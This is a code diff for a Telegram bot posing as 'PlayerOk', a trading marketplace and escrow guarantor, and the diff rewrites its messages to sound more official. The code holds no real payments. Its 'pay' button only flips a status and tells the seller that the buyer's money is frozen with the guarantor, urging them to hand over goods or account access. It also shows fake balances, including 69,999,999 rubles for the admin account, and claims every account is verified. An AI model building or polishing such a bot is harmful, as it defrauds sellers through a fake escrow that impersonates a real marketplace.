@@ -7,28 +7,41 @@ bot.use(session());
 const ADMIN = 'k13_way';
 const users = {}, deals = {};
 
-// Фиксация chat_id для отправки пушей по юзернейму
+const getWelcomeText = () => {
+  return `Добро пожаловать 👋\n\n` +
+    `✅ *PlayerOk* — специализированный маркетплейс и торговый гарант по обеспечению полной безопасности внебиржевых сделок.\n\n` +
+    `🥇 Автоматизированный алгоритм исполнения.\n` +
+    `🔎 Скорость, верификация и защита.\n` +
+    `💳 Удобный и моментальный вывод средств.\n\n` +
+    `• Комиссия сервиса: 1%\n` +
+    `• Режим работы системы: 24/7\n` +
+    `• Главный модератор: @sw1zyy01\n\n` +
+    `🛡️ Выберите нужный раздел ниже:`;
+};
+
+const getMainKeyboard = () => Markup.inlineKeyboard([
+  [Markup.button.callback('💳 Баланс', 'bal'), Markup.button.callback('🤝 Создать сделку', 'create')],
+  [Markup.button.callback('🛡️ Безопасность', 'safe'), Markup.button.callback('👨‍💻 Поддержка', 'supp')]
+]);
+
 bot.start((ctx) => {
   if (ctx.from.username) users[ctx.from.username.toLowerCase()] = ctx.chat.id;
   if (ctx.session) ctx.session = {};
-  return ctx.replyWithMarkdown(`Добро пожаловать 👋\n\n✅ *PlayerOk* — торговый гарант.\n• Модератор: @sw1zyy01`, 
-    Markup.inlineKeyboard([
-      [Markup.button.callback('💳 Баланс', 'bal'), Markup.button.callback('🤝 Создать сделку', 'create')],
-      [Markup.button.callback('🛡️ Безопасность', 'safe'), Markup.button.callback('👨‍💻 Поддержка', 'supp')]
-    ])
-  );
+  return ctx.replyWithMarkdown(getWelcomeText(), getMainKeyboard());
 });
 
 bot.action('bal', (ctx) => {
   const isId = (ctx.from.username || '').toLowerCase() === ADMIN.toLowerCase();
-  return ctx.editMessageText(`💳 Личный кабинет @${ctx.from.username}\n\n💰 Баланс: ${isId ? '69 999 999.00' : '0.00'} руб.`, 
-    Markup.inlineKeyboard([[Markup.button.callback('⬅️ Меню', 'menu')]])
-  ).catch(() => {});
+  const bal = isId ? 69999999 : 0;
+  const text = `💳 *Личный кабинет пользователя* \`@${ctx.from.username}\`\n\n` +
+    `💰 *Баланс:* ${bal.toLocaleString('ru-RU')}.00 руб.\n🔒 *Заморожено в сделках:* 0.00 руб.\n\n` +
+    `📊 *Статистика профиля:*\n• Всего сделок: 0\n• Успешных сделок: 0\n• Споров/Арбитражей: 0\n\n✨ Ваш аккаунт полностью верифицирован системой Гаранта.`;
+  return ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ В главное меню', 'menu')]]) }).catch(() => {});
 });
 
 bot.action('create', (ctx) => {
   ctx.session = { step: 'partner' };
-  return ctx.editMessageText('👤 Введите **@юзернейм** партнера для сделки:', { parse_mode: 'Markdown' });
+  return ctx.editMessageText(`🤝 *Новая сделка PlayerOk*\n\nПожалуйста, введите **@юзернейм** партнера (продавца или покупателя), с кем вы хотите совершить обмен:`, { parse_mode: 'Markdown' });
 });
 
 bot.on('text', async (ctx) => {
@@ -38,12 +51,12 @@ bot.on('text', async (ctx) => {
   if (ctx.session.step === 'partner') {
     ctx.session.partner = txt.replace('@', '').toLowerCase();
     ctx.session.step = 'title';
-    return ctx.reply('📦 Введите название товара:');
+    return ctx.reply('📦 Введите точное *название или описание товара*:', { parse_mode: 'Markdown' });
   }
   if (ctx.session.step === 'title') {
     ctx.session.title = txt;
     ctx.session.step = 'price';
-    return ctx.reply('💰 Введите сумму сделки (число):');
+    return ctx.reply('💰 Введите *сумму сделки* в рублях (только число):', { parse_mode: 'Markdown' });
   }
   if (ctx.session.step === 'price') {
     const price = parseFloat(txt) || 1000;
@@ -53,15 +66,14 @@ bot.on('text', async (ctx) => {
     deals[dealId] = { id: dealId, seller: myName, buyer: ctx.session.partner, title: ctx.session.title, amount: price, status: 'pending', s_chat: ctx.chat.id };
     ctx.session = {};
 
-    ctx.reply(`✅ Сделка #${dealId} на сумму ${price} руб. создана! Бот отправляет её пользователю @${deals[dealId].buyer}...`);
+    ctx.replyWithMarkdown(`✅ *Сделка #${dealId} успешно сформирована!*\n\n📦 *Товар:* ${deals[dealId].title}\n💰 *Сумма:* ${price.toLocaleString('ru-RU')} руб.\n\nБот автоматически отправляет официальный бланк сделки пользователю @${deals[dealId].buyer}...`);
 
     const tChat = users[deals[dealId].buyer];
     if (tChat) {
-      bot.telegram.sendMessage(tChat, `🔔 Предложение о сделке от @${myName}!\n📦 Товар: ${deals[dealId].title}\n💰 Сумма: ${price} руб.`, 
-        Markup.inlineKeyboard([[Markup.button.callback('🤝 Принять сделку', `ok_${dealId}`)]])
-      ).catch(() => {});
+      const propText = `🔔 *Вам поступило официальное предложение о сделке Гаранта PlayerOk!* (#${dealId})\n\n📦 *Товар:* ${deals[dealId].title}\n💰 *Сумма операции:* ${price.toLocaleString('ru-RU')} руб.\n👤 *Инициатор:* @${myName}\n\nВы согласны провести сделку под защитой сервиса?`;
+      bot.telegram.sendMessage(tChat, propText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Принять сделку', `ok_${dealId}`)]]) }).catch(() => {});
     } else {
-      ctx.reply(`⚠️ Пользователь @${deals[dealId].buyer} еще не запускал этого бота. Перешлите ему ссылку на бота.`);
+      ctx.replyWithMarkdown(`⚠️ Пользователь @${deals[dealId].buyer} еще не активировал этого бота. Чтобы он мгновенно получил пуш-заявку, перешлите ему бота, чтобы он нажал /start.`);
     }
   }
 });
@@ -69,34 +81,51 @@ bot.on('text', async (ctx) => {
 bot.action(/^ok_(.+)$/, (ctx) => {
   const d = deals[ctx.match[1]];
   if (!d) return ctx.answerCbQuery('Сделка не найдена.');
-  d.status = 'paid'; // Симулируем автоматическую оплату для скорости теста
+  d.status = 'accepted';
   d.b_chat = ctx.chat.id;
 
-  bot.telegram.sendMessage(d.s_chat, `💰 Пользователь принял сделку и оплатил её! Передайте товар и нажмите кнопку:`, 
-    Markup.inlineKeyboard([[Markup.button.callback('📦 Товар передан', `sent_${d.id}`)]])
+  bot.telegram.sendMessage(d.s_chat, `🔔 Партнёр @${ctx.from.username} принял условия сделки #${d.id}!\n\nОжидайте зачисления средств покупателем на защищённый счёт Гаранта.`).catch(() => {});
+  return ctx.editMessageText(`🤝 *Вы приняли условия сделки #${d.id}*\n\n📦 *Товар:* ${d.title}\n💰 *Сумма к оплате:* ${d.amount.toLocaleString('ru-RU')} руб.\n\nДля перехода к этапу обмена внесите оплату на безопасный баланс:`, 
+    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить внутренним балансом', `pay_${d.id}`)]]) }
   ).catch(() => {});
-  return ctx.editMessageText(`✅ Вы приняли сделку #${d.id} и оплатили балансом. Ожидайте товар.`);
+});
+
+bot.action(/^pay_(.+)$/, (ctx) => {
+  const d = deals[ctx.match[1]];
+  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
+  d.status = 'paid';
+
+  bot.telegram.sendMessage(d.s_chat, `💰 *Покупатель перевёл средства по сделке #${d.id} на счёт Гаранта!*\n\nДеньги заморожены в системе. Вам необходимо передать товар (данные/доступ) покупателю.\nПосле успешной передачи нажмите кнопку ниже:`, 
+    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('📦 Товар полностью передан', `sent_${d.id}`)]]) }
+  ).catch(() => {});
+  return ctx.editMessageText(`✅ *Сделка #${d.id} успешно оплачена!*\n\nСредства заморожены на балансе Гаранта PlayerOk. Ожидайте, пока продавец предоставит вам товар.`).catch(() => {});
 });
 
 bot.action(/^sent_(.+)$/, (ctx) => {
   const d = deals[ctx.match[1]];
   if (!d) return ctx.answerCbQuery('Сделка не найдена.');
-  bot.telegram.sendMessage(d.b_chat, `🎁 Продавец отправил товар! Подтвердите получение:`, 
-    Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить получение', `end_${d.id}`)]])
+  d.status = 'goods_sent';
+
+  bot.telegram.sendMessage(d.b_chat, `📦 *Продавец подтвердил отправку товара по сделке #${d.id}!*\n\nПожалуйста, тщательно проверьте полученные данные. Если всё работает верно, подтвердите выполнение условий:`, 
+    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить получение товара', `end_${d.id}`)]]) }
   ).catch(() => {});
-  return ctx.editMessageText('✅ Вы подтвердили отправку товара.');
+  return ctx.editMessageText(`✅ Уведомление отправлено покупателю. Ожидаем подтверждения успешного получения товара по сделке #${d.id}.`).catch(() => {});
 });
 
 bot.action(/^end_(.+)$/, (ctx) => {
   const d = deals[ctx.match[1]];
   if (!d) return ctx.answerCbQuery('Сделка не найдена.');
-  bot.telegram.sendMessage(d.s_chat, `🎉 Сделка #${d.id} успешно закрыта, деньги у вас на балансе!`).catch(() => {});
-  return ctx.editMessageText('🎉 Сделка успешно завершена!');
+  d.status = 'completed';
+
+  bot.telegram.sendMessage(d.s_chat, `🎉 *Сделка #${d.id} успешно завершена!*\n\nПокупатель подтвердил получение. Средства в размере ${d.amount.toLocaleString('ru-RU')} руб. успешно зачислены на ваш баланс.`).catch(() => {});
+  return ctx.editMessageText(`🎉 *Сделка #${d.id} успешно завершена!*\n\nВы подтвердили выполнение обязательств. Продавец получил выплату. Спасибо за использование торгового маркетплейса PlayerOk!`, 
+    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ В главное меню', 'menu')]]) }
+  ).catch(() => {});
 });
 
-bot.action('menu', (ctx) => ctx.editMessageText('Главное меню', Markup.inlineKeyboard([[Markup.button.callback('💳 Баланс', 'bal'), Markup.button.callback('🤝 Создать сделку', 'create')]])));
-bot.action('safe', (ctx) => ctx.editMessageText('Проводите сделки только внутри бота.', Markup.inlineKeyboard([[Markup.button.callback('⬅️ Меню', 'menu')]])));
-bot.action('supp', (ctx) => ctx.editMessageText('Поддержка: @sw1zyy01', Markup.inlineKeyboard([[Markup.button.callback('⬅️ Меню', 'menu')]])));
+bot.action('menu', (ctx) => ctx.editMessageText(getWelcomeText(), { parse_mode: 'Markdown', ...getMainKeyboard() }).catch(() => {}));
+bot.action('safe', (ctx) => ctx.editMessageText(`🛡️ *Правила безопасности PlayerOk*\n\n1. *Внутренние транзакции:* Проводите оплату строго через систему Гаранта бота. Прямые переводы лишают вас защиты.\n2. *Проверка:* Никогда не подтверждайте получение товара до его полной проверки.`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Меню', 'menu')]]) }).catch(() => {}));
+bot.action('supp', (ctx) => ctx.editMessageText(`👨‍💻 *Служба поддержки PlayerOk*\n\nЕсли у вас возник спор или технический вопрос по транзакциям, свяжитесь со специалистом.\n\n✍️ *Главный модератор:* @sw1zyy01`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Меню', 'menu')]]) }).catch(() => {}));
 
-bot.launch().then(() => console.log('OK'));
-http.createServer((r, s) => { s.writeHead(200); s.end(); }).listen(process.env.PORT || 3000);
+bot.launch().then(() => console.log('PlayerOk Гарант запущен!'));
+http.createServer((req, res) => { res.writeHead(200); res.end('OK'); }).listen(process.env.PORT || 3000);
